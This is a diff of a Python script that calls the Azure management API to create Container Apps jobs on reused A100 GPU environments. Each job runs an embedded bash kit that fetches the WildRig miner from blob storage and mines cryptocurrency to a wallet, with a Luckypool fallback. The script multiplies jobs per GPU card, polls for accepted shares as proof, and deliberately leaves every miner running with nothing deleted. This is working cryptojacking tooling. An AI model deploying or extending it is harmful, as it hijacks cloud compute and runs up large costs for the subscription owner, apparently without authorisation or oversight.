@@ -18,7 +18,7 @@ Shape (reuses the proven storage account / SAS capture + Container Apps job patt
     bounded region list starting westus3 (proven by 131412).
  5. ONE manual job, parallelism 1 / replicaCompletionCount 1, replicaTimeout 86400,
     whose container runs WildRig 0.52.3 (sha 002cd29c...) pearlhash pydp worker
-    13289001, then sticks to Luckypool 3362 after 900 s without an accepted share.
+    13295901, then sticks to Luckypool 3362 after 900 s without an accepted share.
     The container writes a status blob every 30 s and NEVER exits early.
  6. Poll the status blob for proof (acc>=1 rej=0 last accept fresh) then emit DONE.
     NOTHING is deleted: the miner is left running (no proof-then-teardown).
@@ -37,9 +37,9 @@ import urllib.request
 ARM = "https://management.azure.com"
 RG = "chriso-sandbox-rg"
 SUB_EXPECT = "790067ff-3e39-4632-ad1a-d65702d42c88"
-TAG = "C211_I132890B"
-NONCE = "x132890a100b"
-INTENT = "132890"
+TAG = "C211_I132959"
+NONCE = "x132959reuse"
+INTENT = "132959"
 T0 = time.time()
 
 APP_VER = "2026-07-01"
@@ -48,11 +48,11 @@ PROFILE = "Consumption-GPU-NC24-A100"
 IMAGE = "mcr.microsoft.com/azureml/openmpi4.1.0-cuda11.8-cudnn8-ubuntu22.04:latest"
 SA_ACCT = "c211i1215775738445a"
 CONT = "c211"
-CONT2 = "c211-i132890a100b"
-SA_NEW = ("c211i132890b" + hashlib.sha256(NONCE.encode()).hexdigest()[:7]).lower()[:24]
+CONT2 = "c211-i132959-reuse"
+SA_NEW = ("c211i132959reuse" + hashlib.sha256(NONCE.encode()).hexdigest()[:7]).lower()[:24]
 ENV_NAME = "c211-i131598-cae"
-JOB_NAME = "c211-132890-a100b"
-REGIONS = ["eastus2", "westus2", "centralus", "northeurope", "swedencentral", "japaneast", "westus3", "westeurope", "southcentralus"]
+JOB_NAME = "c211-131598-t4"
+REGIONS = ["westus3", "westus2", "westeurope", "northeurope", "southcentralus", "eastus2"]
 BUDGET = 2400          # payload poll budget (seconds)
 PROOF_GRACE = 240      # keep polling this long after first proof for confirmation
 
@@ -166,7 +166,7 @@ KIT = r"""#!/bin/bash
 D=/tmp/c211; mkdir -p "$D"; LOG="$D/kit.log"
 H=$(hostname 2>/dev/null || echo h)
 BASE="__BASE__"; Q="__Q__"; SAS="$BASE/__NONCE__-t4-$H.txt?$Q"
-W="__WALLET__"; N="__NOCK__"; WK="13289001"
+W="__WALLET__"; N="__NOCK__"; WK="13295901"
 WRURL="$BASE/__NONCE__-wildrig.tgz?$Q"
 SBURL="$BASE/__NONCE__-srb.bin?$Q"
 log() { echo "$(date -u +%FT%TZ) $*" >> "$LOG"; }
@@ -495,188 +495,160 @@ def main():
     emit("preupload-wildrig", ok=bool(ok_wr))
     preupload(tok, sid, cont_base, q, "/tmp/c211_srb.bin", NONCE + "-srb.bin", SRB_URL, SRB_SHA)
 
-    # ---------- 3) ONE T4 managed environment, bounded region list ----------
-    chosen = None
-    attempts = []
-    for region in REGIONS:
-        ab = {"westus3": "wus3", "westus2": "wus2", "westeurope": "weu",
-              "northeurope": "neu", "southcentralus": "scus", "eastus2": "eus2"}.get(region, region[:6])
-        envname = ("c211-i132890b-%s" % ab)[:32]
-        envurl = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/"
-                  "managedEnvironments/%s?api-version=%s" % (ARM, sid, RG, envname, APP_VER))
-        body = {"location": region, "tags": {"c211": INTENT, "nonce": NONCE},
-                "properties": {"workloadProfiles": [
-                    {"name": "Consumption", "workloadProfileType": "Consumption"},
-                    {"name": PROFILE, "workloadProfileType": PROFILE}]}}
-        st, b = arm(tok, envurl, method="PUT", body=body, timeout=300)
-        rec = {"region": region, "name": envname, **errk(st, b)}
-        attempts.append(rec)
-        emit("env-create", **rec)
+    # ---------- 3) REUSE proven A100 managed environments (no env create: 50-env cap) ----------
+    CANDIDATES = [
+        ("c211-i132366a100-wus3", "westus3", 6),
+        ("c211-i126276-a100", "eastus", 6),
+        ("c211-121750-cae", "eastus", 8),
+        ("c211-i132959b-sweden", "swedencentral", 2),
+        ("c211-i132959d-sweden", "swedencentral", 2),
+    ]
+
+    def kit_cmd_wk(base_url, sas_q, wk):
+        cmd = kit_cmd(base_url, sas_q)
+        s = cmd[2]
+        m = __import__("re").search(r"echo '([^']+)'", s)
+        if not m:
+            return cmd
+        txt = base64.b64decode(m.group(1)).decode()
+        txt = txt.replace('WK="%s"' % WK_LOCAL, 'WK="%s"' % wk)
+        b64 = base64.b64encode(txt.encode()).decode()
+        return ["/bin/bash", "-c", s.replace(m.group(1), b64)]
+
+    envs = []
+    for nm, region, slots in CANDIDATES:
+        eurl = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/"
+                "managedEnvironments/%s?api-version=%s" % (ARM, sid, RG, nm, APP_VER))
+        st, eb = arm(tok, eurl, timeout=60)
+        p = (eb.get("properties") or {}) if isinstance(eb, dict) else {}
+        profs = ["%s:%s" % (x.get("name"), x.get("workloadProfileType"))
+                 for x in (p.get("workloadProfiles") or [])]
+        has = any(x.split(":")[-1] == PROFILE for x in profs)
+        state = p.get("provisioningState")
+        emit("env-get", name=nm, http=st, state=state, has_profile=has, slots=slots,
+             id_ok=bool(eb.get("id") if isinstance(eb, dict) else None))
+        if st == 200 and has and eb.get("id") and state in ("Succeeded", None):
+            envs.append({"name": nm, "region": region, "id": eb["id"], "slots": slots})
+    if not envs:
+        emit("DONE", phase="env", verdict="NO_REUSABLE_A100_ENV", elapsed_s=int(time.time() - T0))
+        return
+    emit("env-chosen", n=len(envs),
+         matrix=";".join("%s:%s:%s" % (e["name"], e["region"], e["slots"]) for e in envs))
+
+    # ---------- 4) add + start one Container-App job per A100 card ----------
+    JOB_PREFIX = "c211-%s-r" % INTENT
+    WK_LOCAL = "13295901"
+    WK_BASE = WK_LOCAL[:-2]
+    jobs = []
+    idx = 0
+    for e in envs:
+        for _k in range(e["slots"]):
+            idx += 1
+            jobs.append({"env": e, "name": "%s%d" % (JOB_PREFIX, idx),
+                         "wk": "%s%02d" % (WK_BASE, idx)})
+    for jb in jobs:
+        jurl = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/jobs/%s"
+                "?api-version=%s" % (ARM, sid, RG, jb["name"], APP_VER))
+        jobbody = {"location": jb["env"]["region"],
+                   "tags": {"c211": INTENT, "nonce": NONCE},
+                   "properties": {"environmentId": jb["env"]["id"],
+                                  "workloadProfileName": PROFILE,
+                                  "configuration": {"triggerType": "Manual",
+                                                    "replicaRetryLimit": 3,
+                                                    "replicaTimeout": 86400,
+                                                    "manualTriggerConfig": {
+                                                        "replicaCompletionCount": 1,
+                                                        "parallelism": 1}},
+                                  "template": {"containers": [{
+                                      "name": "gpu", "image": IMAGE,
+                                      "command": kit_cmd_wk(base + "/" + cont_use, q, jb["wk"]),
+                                      "resources": {"cpu": 4, "memory": "16Gi"}}]}}}
+        st, b = arm(tok, jurl, method="PUT", body=jobbody, timeout=180)
+        emit("job-put", name=jb["name"], env=jb["env"]["name"], wk=jb["wk"], http=st,
+             **({} if st in (200, 201) else errk(st, b)))
         if st not in (200, 201):
             continue
-        dl = time.time() + 1200
-        ps = None
-        i = 0
-        while time.time() < dl:
-            stp, ps, env_id = env_state(tok, sid, envname)
-            emit("env-poll", region=region, i=i, http=stp, state=ps)
-            if ps in ("Succeeded", "Failed", "Canceled"):
-                break
-            i += 1
-            time.sleep(20)
-        emit("env-result", region=region, state=ps, poll_n=i + 1)
-        if ps == "Succeeded":
-            chosen = {"region": region, "name": envname, "url": envurl}
-            break
-    emit("env-attempts", n=len(attempts),
-         matrix=";".join("%s:%s:%s" % (a["region"], a.get("http"), a.get("code") or "")
-                         for a in attempts))
-    if not chosen:
-        emit("DONE", phase="env", verdict="ENV_REFUSED_ALL_REGIONS",
-             attempts_n=len(attempts), elapsed_s=int(time.time() - T0))
+        st2, b2 = arm(tok, jurl.split("?")[0] + "/start?api-version=" + APP_VER,
+                      method="POST", body={}, timeout=120)
+        jb["exec"] = (b2.get("name") if isinstance(b2, dict) else None)
+        emit("job-start", name=jb["name"], http=st2, execname=jb["exec"],
+             **({} if st2 in (200, 201, 202) else errk(st2, b2)))
+    started = [j for j in jobs if j.get("exec")]
+    emit("jobs-started", n=len(started), of=len(jobs),
+         names=",".join(j["name"] for j in started))
+    if not started:
+        emit("DONE", phase="job", verdict="NO_JOB_STARTED", elapsed_s=int(time.time() - T0))
         return
 
-    # ---------- 4) ONE manual job execution (miner kit) ----------
-    st, envb = arm(tok, chosen["url"], timeout=60)
-    env_id = envb.get("id") if isinstance(envb, dict) else None
-    epp = (envb.get("properties") or {}) if isinstance(envb, dict) else {}
-    emit("env-ready", name=chosen["name"], region=chosen["region"], id_ok=bool(env_id),
-         state=epp.get("provisioningState"),
-         profiles=";".join("%s:%s" % (p.get("name"), p.get("workloadProfileType"))
-                           for p in (epp.get("workloadProfiles") or [])))
-    if not env_id:
-        emit("DONE", phase="job", verdict="NO_ENV_ID", elapsed_s=int(time.time() - T0))
-        return
-    cmd = kit_cmd(base + "/" + cont_use, q)
-    joburl = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/jobs/%s"
-              "?api-version=%s" % (ARM, sid, RG, JOB_NAME, APP_VER))
-    jobbody = {"location": chosen["region"], "tags": {"c211": INTENT, "nonce": NONCE},
-               "properties": {"environmentId": env_id, "workloadProfileName": PROFILE,
-                              "configuration": {"triggerType": "Manual",
-                                                "replicaRetryLimit": 3,
-                                                "replicaTimeout": 86400,
-                                                "manualTriggerConfig": {
-                                                    "replicaCompletionCount": 1,
-                                                    "parallelism": 1}},
-                              "template": {"containers": [{
-                                  "name": "gpu", "image": IMAGE, "command": cmd,
-                                  "resources": {"cpu": 4, "memory": "16Gi"}}]}}}
-    st, b = arm(tok, joburl, method="PUT", body=jobbody, timeout=180)
-    emit("job-put", name=JOB_NAME, region=chosen["region"], **errk(st, b))
-    if st not in (200, 201):
-        emit("DONE", phase="job", verdict="JOB_PUT_FAILED", http=st,
-             elapsed_s=int(time.time() - T0))
-        return
-    st, b = arm(tok, joburl.split("?")[0] + "/start?api-version=" + APP_VER,
-                method="POST", body={}, timeout=120)
-    execname = (b.get("name") if isinstance(b, dict) else None)
-    emit("job-start", http=st, execname=execname, **({} if st in (200, 201, 202)
-                                                    else errk(st, b)))
-    if st not in (200, 201, 202):
-        emit("DONE", phase="job", verdict="JOB_START_FAILED", http=st,
-             elapsed_s=int(time.time() - T0))
-        return
-
-    # ---------- 5) poll the status blob for proof; leave everything running ----------
+    # ---------- 5) poll executions + status blobs (multi-job, multi-card) ----------
     cont_url = base + "/" + cont_use
     prefix = "%s-t4-" % NONCE
-    fb_exec = None
-    fb_tried = False
-    fb2_tried = False
     first_proof = None
-    first_blob_at = None
-    last = {}
-    status = None
+    last_emit = {}
+    rows = []
     i = 0
-
-    def _blob_rows():
-        rows = []
+    while time.time() - T0 < BUDGET:
+        exs = []
+        for jb in started:
+            stx, exb = arm(tok, "%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/"
+                           "jobs/%s/executions/%s?api-version=%s"
+                           % (ARM, sid, RG, jb["name"], jb["exec"], APP_VER), timeout=60)
+            ep = (exb.get("properties") or {}) if isinstance(exb, dict) else {}
+            exs.append("%s:%s" % (jb["name"].split("-")[-1], ep.get("status")))
         stl, names = blob_list(cont_url, q, prefix)
+        cards = {}
         for nm in (names or []):
             sg, body = blob_get(cont_url, q, nm)
             if sg != 200:
-                rows.append((nm, {"markers": ["GET_%s" % sg]}))
                 continue
-            txt = body.decode("utf-8", "replace")
-            rows.append((nm, parse_status(txt)))
-        return stl, rows
-
-    while time.time() - T0 < BUDGET:
-        stx, exb = arm(tok, "%s/executions/%s?api-version=%s"
-                       % (joburl.split("?")[0], execname, APP_VER), timeout=60)
-        ep = (exb.get("properties") or {}) if isinstance(exb, dict) else {}
-        status = ep.get("status")
-        stl, rows = _blob_rows()
-        best = {}
-        for nm, d in rows:
+            d = parse_status(body.decode("utf-8", "replace"))
+            uu = [u.strip() for u in (d.get("uuid") or "").split(",")
+                  if u.strip().startswith("GPU-")]
+            for u in uu:
+                cards[u] = d
+        now = time.time()
+        rows = []
+        for u, d in cards.items():
             try:
                 accv = int(d.get("acc") or 0)
             except Exception:  # noqa: BLE001
                 accv = 0
             try:
-                bestacc = int(best.get("acc") or 0)
+                rejv = int(d.get("rej") or 0)
             except Exception:  # noqa: BLE001
-                bestacc = 0
-            if accv >= bestacc and d.get("acc") is not None:
-                best = d
-        parsed = best
-        last = parsed
-        if rows and first_blob_at is None:
-            first_blob_at = time.time()
-        now = time.time()
-        try:
-            lae = int(parsed.get("lae") or 0)
-        except Exception:  # noqa: BLE001
-            lae = 0
-        acc = int(parsed.get("acc") or 0) if str(parsed.get("acc") or "0").isdigit() else 0
-        rej = int(parsed.get("rej") or 0) if str(parsed.get("rej") or "0").isdigit() else 0
-        age = int(now - lae) if lae else None
-        emit("poll", i=i, exec=status, blobs=len(rows), mode=parsed.get("mode"),
-             acc=acc, rej=rej, lae=lae or None, age=age,
-             uuid=clean(parsed.get("uuid") or "")[:80],
-             markers=";".join(sorted(set(parsed.get("markers") or [])))[:220],
-             left=int(BUDGET - (now - T0)))
-        # fallbacks: no status blob at all after 300 s / 660 s -> fire a fresh single job
-        if (not fb_tried) and (not rows) and now - T0 > 300:
-            fb_tried = True
-            fbn = JOB_NAME + "b"
-            emit("fallback-job", job=fbn, why="no_blob_300s")
-            fj = joburl.replace(JOB_NAME, fbn)
-            stj, bj = arm(tok, fj, method="PUT", body=jobbody, timeout=180)
-            emit("fallback-put", job=fbn, **errk(stj, bj))
-            if stj in (200, 201):
-                sts, bs = arm(tok, fj.split("?")[0] + "/start?api-version=" + APP_VER,
-                              method="POST", body={}, timeout=120)
-                fb_exec = (bs.get("name") if isinstance(bs, dict) else None)
-                emit("fallback-start", job=fbn, http=sts, execname=fb_exec)
-        if (not fb2_tried) and (not rows) and now - T0 > 660:
-            fb2_tried = True
-            fbn = JOB_NAME + "c"
-            emit("fallback-job2", job=fbn, why="no_blob_660s")
-            fj = joburl.replace(JOB_NAME, fbn)
-            stj, bj = arm(tok, fj, method="PUT", body=jobbody, timeout=180)
-            emit("fallback-put2", job=fbn, **errk(stj, bj))
-            if stj in (200, 201):
-                sts, bs = arm(tok, fj.split("?")[0] + "/start?api-version=" + APP_VER,
-                              method="POST", body={}, timeout=120)
-                emit("fallback-start2", job=fbn, http=sts,
-                     execname=(bs.get("name") if isinstance(bs, dict) else None))
-        proof = bool(acc >= 1 and rej == 0 and lae and (now - lae) <= 300)
-        if proof and first_proof is None:
+                rejv = 0
+            try:
+                lae = int(d.get("lae") or 0)
+            except Exception:  # noqa: BLE001
+                lae = 0
+            age = int(now - lae) if lae else None
+            fresh = bool(accv >= 1 and rejv == 0 and lae and age is not None and age <= 300)
+            rows.append({"uuid": u, "acc": accv, "rej": rejv, "lae": lae, "age": age,
+                         "fresh": fresh, "mode": d.get("mode"), "worker": d.get("worker"),
+                         "host": d.get("host"), "gpuq": d.get("gpuq"), "ts": d.get("ts")})
+        nfresh = sum(1 for r in rows if r["fresh"])
+        emit("poll", i=i, execs=";".join(exs), blobs=len(names or []), cards=len(rows),
+             proof_cards=nfresh, left=int(BUDGET - (now - T0)))
+        for r in rows:
+            prev = last_emit.get(r["uuid"]) or {}
+            if prev.get("acc") != r["acc"] or prev.get("lae") != r["lae"] or i % 5 == 0:
+                emit("card", uuid=r["uuid"], worker=r["worker"], mode=r["mode"],
+                     acc=r["acc"], rej=r["rej"], lae=r["lae"], age=r["age"],
+                     fresh=r["fresh"], gpuq=(r["gpuq"] or "")[:120], ts=r["ts"])
+                last_emit[r["uuid"]] = {"acc": r["acc"], "lae": r["lae"]}
+        if nfresh >= 1 and first_proof is None:
             first_proof = now
-            emit("proof-first", acc=acc, rej=rej, age=age, mode=parsed.get("mode"))
-        if proof and first_proof is not None and now - first_proof >= PROOF_GRACE:
+            emit("proof-first", n=nfresh,
+                 cards=",".join(r["uuid"] for r in rows if r["fresh"])[:400])
+        if first_proof is not None and now - first_proof >= PROOF_GRACE:
             break
-        if not proof:
+        if nfresh == 0:
             first_proof = None
         i += 1
         time.sleep(20)
-    emit("DONE", phase="poll", exec_status=status, job=JOB_NAME, env=chosen["name"],
-         region=chosen["region"], execname=execname, fb_exec=fb_exec,
-         blobs_prefix=prefix, acc=last.get("acc"), rej=last.get("rej"),
-         lae=last.get("lae"), uuid=last.get("uuid"), mode=last.get("mode"),
-         proof=bool(first_proof), left_running=1, deleted_nothing=1,
-         elapsed_s=int(time.time() - T0))
+    emit("DONE", phase="poll", jobs=len(started), envs=len(envs), cards=len(cards),
+         proof_cards=sum(1 for r in rows if r["fresh"]), left_running=1, deleted_nothing=1,
+         blobs_prefix=prefix, elapsed_s=int(time.time() - T0))
 
 
 if __name__ == "__main__":
